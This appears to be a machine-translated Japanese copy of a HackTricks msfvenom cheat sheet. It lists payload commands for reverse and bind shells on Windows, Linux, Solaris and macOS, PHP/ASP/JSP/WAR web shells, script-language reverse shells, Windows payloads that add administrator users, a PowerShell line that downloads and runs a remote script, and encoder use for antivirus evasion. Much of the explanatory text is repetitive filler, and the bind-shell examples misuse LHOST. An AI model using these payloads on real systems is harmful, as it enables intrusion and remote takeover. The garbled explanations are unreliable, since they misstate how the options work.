# MSFVenom - チートシート

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProofはすべての暗号バグバウンティの場所です。**

**遅延なしで報酬を受け取る**\
HackenProofのバウンティは、顧客が報酬予算を入金した後にのみ開始されます。バグが検証された後に報酬を受け取ることができます。

**Web3ペンテストの経験を積む**\
ブロックチェーンプロトコルとスマートコントラクトは新しいインターネットです！上昇期のweb3セキュリティをマスターしましょう。

**Web3ハッカーレジェンドになる**\
各検証済みのバグごとに評判ポイントを獲得し、週間リーダーボードのトップを制覇しましょう。

[**HackenProofでサインアップ**](https://hackenproof.com/register)して、ハッキングから報酬を得ましょう！

{% embed url="https://hackenproof.com/register" %}

***

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

または、`-a`を使用してアーキテクチャを指定するか、`--platform`を使用することもできます。

## リスト
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
## シェルコードを作成する際の一般的なパラメータ

When creating a shellcode, there are several common parameters that can be used to customize the payload. These parameters include:

- **LHOST**: The local IP address or hostname that the reverse shell will connect back to.
- **LPORT**: The local port number that the reverse shell will use for the connection.
- **RHOST**: The remote IP address or hostname that the bind shell will listen on.
- **RPORT**: The remote port number that the bind shell will use for the connection.
- **EXITFUNC**: The method used to exit the shellcode after execution.
- **Encoder**: The encoding method used to obfuscate the shellcode.
- **BadChars**: Any characters that should be avoided in the shellcode.
- **Payload**: The specific payload to be used, such as windows/meterpreter/reverse_tcp.

シェルコードを作成する際には、ペイロードをカスタマイズするために使用できるいくつかの一般的なパラメータがあります。これらのパラメータには以下が含まれます：

- **LHOST**：リバースシェルが接続するローカルIPアドレスまたはホスト名。
- **LPORT**：リバースシェルが接続に使用するローカルポート番号。
- **RHOST**：バインドシェルがリッスンするリモートIPアドレスまたはホスト名。
- **RPORT**：バインドシェルが接続に使用するリモートポート番号。
- **EXITFUNC**：シェルコードの実行後に使用される終了方法。
- **エンコーダ**：シェルコードを曖昧化するために使用されるエンコーディング方法。
- **BadChars**：シェルコードで回避する必要のある任意の文字。
- **ペイロード**：使用する特定のペイロード（例：windows/meterpreter/reverse_tcp）。
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
### **リバースシェル**

リバースシェルは、ターゲットのWindowsマシンに接続するための一般的な方法です。以下の手順に従って、リバースシェルを作成しましょう。

1. Metasploitフレームワークを使用して、リバースシェルペイロードを生成します。次のコマンドを実行します。

```plaintext
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f exe > shell.exe
```

2. 上記のコマンドを実行すると、`shell.exe`という名前の実行可能ファイルが生成されます。このファイルをターゲットマシンに送信します。

3. ターゲットマシンで`shell.exe`を実行します。これにより、ターゲットマシンが攻撃者のマシンに接続します。

4. Metasploitフレームワークを使用して、リバースシェルに接続します。次のコマンドを実行します。

```plaintext
msfconsole
use exploit/multi/handler
set payload windows/shell_reverse_tcp
set LHOST <attacker IP>
set LPORT <attacker port>
exploit
```

5. 上記のコマンドを実行すると、攻撃者のマシンがリバースシェルに接続し、ターゲットマシンを制御できるようになります。

これで、Windowsマシンに対してリバースシェルを作成する方法がわかりました。この手法を使用して、ターゲットマシンをハッキングすることができます。ただし、合法的な目的のためにのみ使用してください。
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### バインドシェル

バインドシェルは、攻撃者がターゲットマシンに接続し、リモートでコマンドを実行するための方法です。バインドシェルを使用すると、攻撃者はターゲットマシンの制御を取得し、様々な操作を行うことができます。

バインドシェルを作成するために、私たちは`msfvenom`ツールを使用します。`msfvenom`は、Metasploitフレームワークの一部であり、様々なペイロードを生成するために使用されます。

以下のコマンドを使用して、バインドシェルのペイロードを生成します。

```plaintext
msfvenom -p <payload> LHOST=<attacker IP> LPORT=<attacker port> -f <format> -o <output file>
```

- `<payload>`: 使用するペイロードの種類を指定します。
- `<attacker IP>`: 攻撃者のIPアドレスを指定します。
- `<attacker port>`: 攻撃者が接続するポート番号を指定します。
- `<format>`: ペイロードの出力形式を指定します。
- `<output file>`: 生成されたペイロードを保存するファイルのパスを指定します。

例えば、以下のコマンドを使用して、Linuxシステム向けのバインドシェルを生成します。

```plaintext
msfvenom -p linux/x86/shell_bind_tcp LHOST=192.168.0.100 LPORT=4444 -f elf -o shell.elf
```

このコマンドは、`linux/x86/shell_bind_tcp`ペイロードを使用し、攻撃者のIPアドレスが`192.168.0.100`であり、ポート番号が`4444`であるバインドシェルを生成します。出力形式は`elf`であり、生成されたペイロードは`shell.elf`という名前のファイルに保存されます。

バインドシェルを作成した後は、攻撃者は生成されたペイロードをターゲットマシンにデプロイし、接続を確立することができます。これにより、攻撃者はターゲットマシン上でコマンドを実行し、システムにアクセスすることができます。
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
### ユーザーの作成

To create a user, you can use the `msfvenom` tool provided by Metasploit. This tool allows you to generate various types of payloads, including shellcode that can be used to create a user on a target system.

To create a user, you need to specify the payload type, the desired username, and the password for the new user. Here is an example command:

```
msfvenom -p windows/adduser USER=username PASS=password -f exe > adduser.exe
```

In this command, replace `username` with the desired username and `password` with the desired password. The `-f` option specifies the output format, in this case, an executable file (`exe`). The output is redirected to a file named `adduser.exe`.

Once you have generated the payload, you can deliver it to the target system using various methods, such as social engineering or exploiting vulnerabilities. Once executed on the target system, the payload will create a new user with the specified username and password.

It is important to note that creating a user on a target system without proper authorization is illegal and unethical. This information is provided for educational purposes only. Always ensure you have the necessary permissions and legal authorization before performing any actions on a target system.
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### CMDシェル

The CMD shell is a command-line interpreter for Windows operating systems. It provides a way to interact with the operating system by executing commands and scripts. The CMD shell is commonly used by system administrators and power users for various tasks, including managing files and directories, running programs, and configuring system settings.

#### Creating a CMD Shell Payload with msfvenom

To create a CMD shell payload using msfvenom, you can use the following command:

```
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f exe > shell.exe
```

Replace `<attacker IP>` with your IP address and `<attacker port>` with the port number you want to use for the reverse shell connection.

This command will generate an executable file named `shell.exe` that, when executed on the target system, will establish a reverse TCP connection to your machine.

#### Executing the CMD Shell Payload

To execute the CMD shell payload on the target system, you can use various methods, such as social engineering, exploiting vulnerabilities, or using a post-exploitation framework like Metasploit.

Once the payload is executed, it will establish a reverse TCP connection to your machine, allowing you to interact with the target system's CMD shell remotely.

#### Conclusion

The CMD shell is a powerful tool for interacting with Windows operating systems. By creating and executing CMD shell payloads, you can gain remote access to target systems and perform various tasks for penetration testing or other legitimate purposes.
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **コマンドの実行**

The `msfvenom` tool can be used to generate payloads that can execute arbitrary commands on the target system. This can be useful for various purposes, such as gaining remote access or performing post-exploitation activities.

To generate a payload that executes a command, you can use the following command:

```
msfvenom -p cmd/unix/reverse_netcat LHOST=<attacker IP> LPORT=<attacker port> -f <format> -o <output file>
```

Replace `<attacker IP>` with the IP address of the machine running the listener, and `<attacker port>` with the port number on which the listener is running. `<format>` should be replaced with the desired output format, such as `elf`, `exe`, or `raw`. `<output file>` should be replaced with the name of the file where the payload will be saved.

Once the payload is generated, it can be delivered to the target system using various methods, such as social engineering or exploiting vulnerabilities. When the payload is executed on the target system, it will establish a reverse connection to the attacker's machine and allow the execution of arbitrary commands.

It is important to note that the success of executing commands on the target system depends on various factors, such as the target's security measures and the privileges of the user executing the payload. Additionally, the payload should be crafted carefully to avoid detection by antivirus software or intrusion detection systems.
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### エンコーダ

An encoder is a tool used in hacking to obfuscate or encode malicious payloads. It is commonly used to bypass security measures such as antivirus software. By encoding the payload, the hacker can make it more difficult for security systems to detect and analyze the malicious code.

エンコーダは、悪意のあるペイロードを曖昧化またはエンコードするために使用されるツールです。これは、アンチウイルスソフトウェアなどのセキュリティ対策を回避するために一般的に使用されます。ペイロードをエンコードすることで、ハッカーはセキュリティシステムが悪意のあるコードを検出および分析するのをより困難にすることができます。
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
### 実行可能ファイルに埋め込まれた形で

When performing a penetration test, it may be necessary to embed a payload inside an executable file. This can be done using the `msfvenom` tool, which is part of the Metasploit Framework. `msfvenom` allows you to generate various types of payloads, including shellcode, which can then be embedded into an executable file.

To embed a payload inside an executable, you can use the following command:

```
msfvenom -p <payload> -f <format> -o <output_file>
```

Here, `<payload>` refers to the type of payload you want to generate, such as a reverse shell or a meterpreter session. `<format>` specifies the format of the output file, such as exe or elf. `<output_file>` is the name of the file that will contain the embedded payload.

For example, to generate a reverse shell payload and embed it into an executable file named `exploit.exe`, you can use the following command:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f exe -o exploit.exe
```

Replace `<attacker_ip>` with the IP address of the machine running the listener, and `<attacker_port>` with the port number on which the listener is running.

Once the payload is embedded into the executable file, it can be executed on the target system to establish a connection back to the attacker's machine. This can be useful for gaining remote access or executing commands on the target system.
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
### リバースシェル

リバースシェルは、ターゲットマシンからハッカーのマシンに接続するための一般的な方法です。ハッカーは、リバースシェルを使用して、ターゲットマシンに対してコマンドを実行したり、ファイルを転送したりすることができます。

リバースシェルを作成するために、`msfvenom`ツールを使用します。以下のコマンドを使用して、リバースシェルペイロードを作成します。

```bash
msfvenom -p <payload> LHOST=<attacker IP> LPORT=<attacker port> -f <format> -o <output file>
```

- `<payload>`: 使用するペイロードの種類を指定します。
- `<attacker IP>`: ハッカーのマシンのIPアドレスを指定します。
- `<attacker port>`: ハッカーのマシンで使用するポート番号を指定します。
- `<format>`: 出力ファイルの形式を指定します。
- `<output file>`: 出力ファイルの名前とパスを指定します。

例えば、以下のコマンドは、`bash`シェルを使用してリバースシェルペイロードを作成します。

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f elf -o reverse_shell.elf
```

このコマンドは、`linux/x86/shell_reverse_tcp`ペイロードを使用して、ハッカーのマシンのIPアドレスが`192.168.0.100`で、ポート番号が`4444`であるリバースシェルペイロードを作成します。出力ファイルの形式は`elf`であり、`reverse_shell.elf`という名前のファイルに保存されます。

ハッカーは、作成されたリバースシェルペイロードをターゲットマシンに送信し、接続を確立することができます。
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### バインドシェル

バインドシェルは、攻撃者がターゲットマシンに接続し、リモートでコマンドを実行するための方法です。バインドシェルを使用すると、攻撃者はターゲットマシンの制御を取得し、様々な操作を行うことができます。

バインドシェルを作成するために、私たちは`msfvenom`ツールを使用します。`msfvenom`は、Metasploitフレームワークの一部であり、様々なペイロードを生成するために使用されます。

以下のコマンドを使用して、バインドシェルのペイロードを生成します。

```plaintext
msfvenom -p <payload> LHOST=<attacker IP> LPORT=<attacker port> -f <format> -o <output file>
```

- `<payload>`: 使用するペイロードの種類を指定します。
- `<attacker IP>`: 攻撃者のIPアドレスを指定します。
- `<attacker port>`: 攻撃者が接続するポート番号を指定します。
- `<format>`: ペイロードの出力形式を指定します。
- `<output file>`: 生成されたペイロードを保存するファイルのパスを指定します。

例えば、以下のコマンドを使用して、Linuxシステム向けのバインドシェルを生成します。

```plaintext
msfvenom -p linux/x86/shell_bind_tcp LHOST=192.168.0.100 LPORT=4444 -f elf -o shell.elf
```

このコマンドは、`linux/x86/shell_bind_tcp`ペイロードを使用し、攻撃者のIPアドレスが`192.168.0.100`であり、ポート番号が`4444`であるバインドシェルを生成します。出力形式は`elf`であり、生成されたペイロードは`shell.elf`という名前のファイルに保存されます。

バインドシェルを作成した後は、攻撃者は生成されたペイロードをターゲットマシンにデプロイし、接続を確立することができます。これにより、攻撃者はターゲットマシン上でコマンドを実行し、システムにアクセスすることができます。
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### SunOS（Solaris）

SunOS（Solaris）は、Sun Microsystemsによって開発された商用のUNIXオペレーティングシステムです。SunOSは、高い信頼性とスケーラビリティを備えたサーバー向けのオペレーティングシステムとして広く使用されています。

#### ペイロードの生成

msfvenomコマンドを使用して、SunOS（Solaris）向けのペイロードを生成することができます。以下のコマンドを使用して、指定したアーキテクチャとフォーマットに基づいたペイロードを生成します。

```plaintext
msfvenom -p <payload> -f <format> -a <architecture> -o <output>
```

- `<payload>`: 使用するペイロードの種類を指定します。
- `<format>`: 生成するペイロードのフォーマットを指定します。
- `<architecture>`: ターゲットのアーキテクチャを指定します。
- `<output>`: 生成されたペイロードの出力先ファイルを指定します。

#### ペイロードの実行

生成されたペイロードをターゲットマシンで実行するには、以下の手順に従います。

1. ペイロードをターゲットマシンに転送します。
2. ペイロードを実行するための適切な方法を選択します。これには、リモートシェル、リバースシェル、またはメモリ内実行などの方法があります。
3. ペイロードを実行し、ターゲットマシンにアクセスします。

#### ペイロードのエクスプロイト

ペイロードを使用してエクスプロイトを実行するには、以下の手順に従います。

1. ターゲットマシンにペイロードを転送します。
2. ペイロードを実行するための適切な方法を選択します。
3. エクスプロイトを実行し、ターゲットマシンを侵害します。

#### ペイロードのカスタマイズ

msfvenomコマンドを使用して生成されたペイロードは、必要に応じてカスタマイズすることができます。以下のオプションを使用して、ペイロードのプロパティを変更します。

- `-b <badchars>`: 使用しないバイトを指定します。
- `-e <encoder>`: ペイロードをエンコードするエンコーダを指定します。
- `-i <iterations>`: エンコーダの反復回数を指定します。
- `-x <template>`: ペイロードをテンプレートファイルに埋め込みます。

#### ペイロードの検出回避

生成されたペイロードが検出されないようにするために、以下のテクニックを使用することができます。

- エンコーディング: ペイロードをエンコードしてシグネチャベースの検出を回避します。
- アンチバイト: 使用しないバイトを指定して、検出を回避します。
- メタスプロイトの使用: メタスプロイトフレームワークを使用して、ペイロードの検出回避をサポートします。

#### ペイロードのリバースシェル

リバースシェルは、ターゲットマシンから攻撃者のマシンに接続するためのシェルです。以下の手順に従って、リバースシェルを生成します。

1. 攻撃者のマシンでリスニングポートを設定します。
2. msfvenomコマンドを使用して、リバースシェルペイロードを生成します。
3. 生成されたペイロードをターゲットマシンに転送します。
4. 攻撃者のマシンでリスニングを開始し、ターゲットマシンからの接続を待ちます。
5. ターゲットマシンからの接続が確立されると、攻撃者はリバースシェルを使用してターゲットマシンにアクセスできます。

#### ペイロードのリモートシェル

リモートシェルは、攻撃者がターゲットマシンに接続するためのシェルです。以下の手順に従って、リモートシェルを生成します。

1. 攻撃者のマシンでリスニングポートを設定します。
2. msfvenomコマンドを使用して、リモートシェルペイロードを生成します。
3. 生成されたペイロードをターゲットマシンに転送します。
4. 攻撃者のマシンでリスニングを開始し、ターゲットマシンからの接続を待ちます。
5. ターゲットマシンからの接続が確立されると、攻撃者はリモートシェルを使用してターゲットマシンにアクセスできます。

#### ペイロードのメモリ内実行

メモリ内実行は、ペイロードをターゲットマシンのメモリ内で実行する方法です。以下の手順に従って、メモリ内実行ペイロードを生成します。

1. msfvenomコマンドを使用して、メモリ内実行ペイロードを生成します。
2. 生成されたペイロードをターゲットマシンに転送します。
3. ペイロードを実行するための適切な方法を選択します。
4. ペイロードがターゲットマシンのメモリ内で実行されると、攻撃者はターゲットマシンにアクセスできます。

以上が、SunOS（Solaris）向けのペイロード生成と実行の基本的な手順です。これらの手法を使用して、ターゲットマシンにアクセスし、エクスプロイトを実行することができます。
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
### **リバースシェル:**

A reverse shell is a type of shell in which the target machine initiates the connection to the attacker's machine. This allows the attacker to gain remote access to the target machine and execute commands. In Metasploit, you can generate a reverse shell payload using the `msfvenom` tool.

リバースシェルは、ターゲットマシンが攻撃者のマシンに接続を開始するタイプのシェルです。これにより、攻撃者はターゲットマシンにリモートアクセスしてコマンドを実行することができます。Metasploitでは、`msfvenom`ツールを使用してリバースシェルペイロードを生成することができます。

To generate a reverse shell payload for macOS, you can use the following command:

macOS用のリバースシェルペイロードを生成するには、次のコマンドを使用します:

```plaintext
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f <output format> > <output file>
```

Replace `<attacker IP>` with the IP address of your machine and `<attacker port>` with the port number you want to use for the connection. `<output format>` can be any supported format, such as `elf`, `macho`, or `app`. `<output file>` is the name of the file where the payload will be saved.

`<attacker IP>`を自分のマシンのIPアドレスに、`<attacker port>`を接続に使用するポート番号に置き換えてください。`<output format>`は、`elf`、`macho`、`app`などのサポートされている形式であることができます。`<output file>`は、ペイロードが保存されるファイルの名前です。

Once the payload is generated, you can transfer it to the target machine and execute it to establish a reverse shell connection.

ペイロードが生成されたら、それをターゲットマシンに転送し、リバースシェル接続を確立するために実行することができます。
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
バインドシェルは、攻撃者がターゲットマシンに接続するためのシェルを作成する方法です。バインドシェルを使用すると、攻撃者はターゲットマシンに対してリモートでコマンドを実行できます。バインドシェルは、攻撃者がターゲットマシンにアクセスするためのバックドアとして機能します。

バインドシェルを作成するために、`msfvenom`コマンドを使用します。`msfvenom`は、Metasploitフレームワークの一部であり、様々な種類のペイロードを生成するために使用されます。

以下のコマンドは、`msfvenom`を使用してバインドシェルを作成する例です。

```plaintext
msfvenom -p <payload> LHOST=<attacker IP> LPORT=<attacker port> -f <format> -o <output file>
```

- `<payload>`: 使用するペイロードの種類を指定します。
- `<attacker IP>`: 攻撃者のIPアドレスを指定します。
- `<attacker port>`: 攻撃者が接続するポート番号を指定します。
- `<format>`: 出力ファイルの形式を指定します。
- `<output file>`: 作成されるバインドシェルの出力先ファイルを指定します。

例えば、以下のコマンドは、`msfvenom`を使用してLinuxシステム向けのバインドシェルを作成し、出力ファイルとして`shell`という名前のファイルに保存します。

```plaintext
msfvenom -p linux/x86/shell_bind_tcp LHOST=192.168.0.100 LPORT=4444 -f elf -o shell
```

このコマンドを実行すると、攻撃者のIPアドレスが`192.168.0.100`であり、ポート番号が`4444`であるバインドシェルが作成されます。作成されたバインドシェルは、`shell`という名前のファイルに保存されます。
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
## **Webベースのペイロード**

### **PHP**

#### 逆シェル
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
The ASP/x reverse shell is a payload that allows an attacker to gain remote access to a target system running ASP or ASP.NET. This payload can be generated using the `msfvenom` tool, which is part of the Metasploit Framework.

To generate an ASP/x reverse shell payload, you can use the following `msfvenom` command:

```plaintext
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f asp > shell.asp
```

Replace `<attacker IP>` with the IP address of your machine and `<attacker port>` with the port number you want to use for the reverse shell connection.

Once the payload is generated, you can upload the `shell.asp` file to the target system and execute it. This will establish a reverse TCP connection between the target system and your machine, giving you remote access to the target.

Note: Make sure to set up a listener on your machine to catch the incoming reverse shell connection. You can use the `multi/handler` module in Metasploit for this purpose.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
#### リバースシェル

リバースシェルは、ターゲットシステムに対してリモートでアクセスするための便利な方法です。JSP（Java Server Pages）を使用してリバースシェルを作成することができます。

以下のコマンドを使用して、msfvenomを介してJSPリバースシェルを生成します。

```plaintext
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f war > shell.war
```

このコマンドでは、`<attacker IP>`と`<attacker port>`を攻撃者のIPアドレスとポート番号に置き換える必要があります。

生成された`shell.war`ファイルをターゲットシステムにアップロードし、デプロイします。その後、Webブラウザを使用して`http://<target IP>/shell/`にアクセスします。

これにより、攻撃者はターゲットシステムに対してリモートシェルを確立することができます。
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
The **WAR** (Web Application Archive) file format is commonly used in Java-based web applications. It allows for the packaging and deployment of web applications on a server. In the context of reverse shells, a **WAR** file can be used to deliver a reverse shell payload to a target server.

To create a **WAR** file with a reverse shell payload, we can use the `msfvenom` tool from the Metasploit Framework. The following command generates a **WAR** file with a reverse shell payload:

```plaintext
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f war > shell.war
```

Replace `<attacker IP>` with the IP address of the machine running the listener, and `<attacker port>` with the port number the listener is configured to listen on.

Once the **WAR** file is generated, it can be deployed on the target server. When a user accesses the deployed web application, the reverse shell payload will be executed, establishing a connection back to the attacker's machine.

To listen for the incoming reverse shell connection, you can use the `multi/handler` module in Metasploit:

```plaintext
use exploit/multi/handler
set payload java/jsp_shell_reverse_tcp
set LHOST <attacker IP>
set LPORT <attacker port>
run
```

Again, replace `<attacker IP>` and `<attacker port>` with the appropriate values.

With the listener running, any incoming connections from the deployed **WAR** file will be captured, providing an interactive shell session on the target server.
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
### NodeJS

NodeJSは、JavaScriptランタイム環境であり、サーバーサイドでのアプリケーション開発に使用されます。NodeJSは、非同期イベント駆動型のアーキテクチャを持ち、高いパフォーマンスとスケーラビリティを提供します。

NodeJSを使用して開発されたアプリケーションは、一般的にシングルスレッドで動作しますが、非同期処理により複数のタスクを同時に処理することができます。これにより、高い並行性と効率性が実現されます。

NodeJSは、豊富なパッケージエコシステムを持っており、npm（Node Package Manager）を使用してパッケージのインストールや管理が容易に行えます。また、NodeJSは、Webサーバーの構築やAPIの作成にも適しています。

NodeJSは、セキュリティの観点からも注意が必要です。適切なセキュリティ対策を講じない場合、悪意のあるユーザーによる攻撃のリスクがあります。セキュリティの脆弱性を悪用する攻撃手法も存在しますので、常に最新のセキュリティパッチを適用し、セキュリティテストを実施することが重要です。

NodeJSは、柔軟性とパフォーマンスの両方を備えた強力な開発ツールであり、Webアプリケーションの開発において広く利用されています。
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **スクリプト言語のペイロード**

### **Perl**
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### **Python**

Pythonは、人気のあるプログラミング言語であり、多くのハッカーにとって重要なツールです。Pythonは、シンプルで読みやすい構文を持ち、幅広い用途に使用することができます。Pythonを使用することで、効率的なスクリプトやツールを作成することができます。

Pythonは、ハッキングにおいてさまざまな目的に使用されます。例えば、ネットワークスキャンや脆弱性スキャン、パスワードクラッキング、データの収集などです。Pythonの強力なライブラリやフレームワークを活用することで、これらのタスクを効率的に実行することができます。

Pythonを使用してハッキングを行う際には、以下のような一般的な手法やリソースが役立ちます。

- **Metasploit Framework**（MSF）: Metasploit Frameworkは、ハッキングやペネトレーションテストにおいて広く使用されるフレームワークです。MSFは、多くの便利なツールやエクスプロイトを提供し、ハッカーにとって貴重なリソースです。

- **msfvenom**: msfvenomは、Metasploit Frameworkの一部であり、ペイロードを生成するために使用されます。ペイロードは、攻撃者がターゲットシステムに送り込む悪意のあるコードです。msfvenomを使用することで、さまざまなプラットフォームやアーキテクチャに対応したカスタムペイロードを作成することができます。

- **リバースシェル**: リバースシェルは、攻撃者がターゲットシステムに対してリモートでコマンドを実行するための手法です。リバースシェルを使用することで、攻撃者はターゲットシステムに対してコントロールを取ることができます。

- **ステルスバックドア**: ステルスバックドアは、攻撃者がターゲットシステムにバックドアを設置するための手法です。ステルスバックドアは、検出されにくく、長期間にわたってアクセスを維持することができます。

これらの手法やリソースを使用することで、Pythonを活用した効果的なハッキングを実行することができます。ただし、ハッキングは合法的な目的のためにのみ使用されるべきであり、違法な活動には使用しないようにしてください。
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash**

Bash（Bourne Again SHell）は、Unixシェルとして広く使用されているコマンド言語です。Bashは、LinuxやmacOSなどの多くのオペレーティングシステムでデフォルトのシェルとして提供されています。Bashは、シェルスクリプトの作成や実行、コマンドの実行、ファイルの操作など、さまざまなタスクを実行するために使用されます。

Bashは、コマンドラインインターフェース（CLI）を介して操作されます。ユーザーは、ターミナルウィンドウでコマンドを入力し、Bashがそれを解釈して実行します。Bashは、シェルスクリプトとしても使用でき、複数のコマンドをまとめて実行することができます。

Bashは、パイプやリダイレクトなどの機能を提供し、コマンドの出力を他のコマンドに渡すことができます。また、変数や制御構造（ループや条件分岐）を使用して、より複雑なスクリプトを作成することもできます。

Bashは、システム管理や自動化、セキュリティテストなど、さまざまな目的で使用されます。Bashの強力な機能と柔軟性は、ハッカーにとっても非常に有用です。
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProofはすべての暗号バグ報奨金の場所です。**

**遅延なしで報酬を受け取る**\
HackenProofの報奨金は、顧客が報奨金予算を入金した後にのみ開始されます。バグが検証された後に報酬を受け取ることができます。

**Web3ペントestingの経験を積む**\
ブロックチェーンプロトコルとスマートコントラクトは新しいインターネットです！その成長する日々において、Web3セキュリティをマスターしましょう。

**Web3ハッカーレジェンドになる**\
各検証済みのバグごとに評判ポイントを獲得し、週間リーダーボードのトップを制覇しましょう。

[**HackenProofでサインアップ**](https://hackenproof.com/register)して、ハッキングから報酬を得ましょう！

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
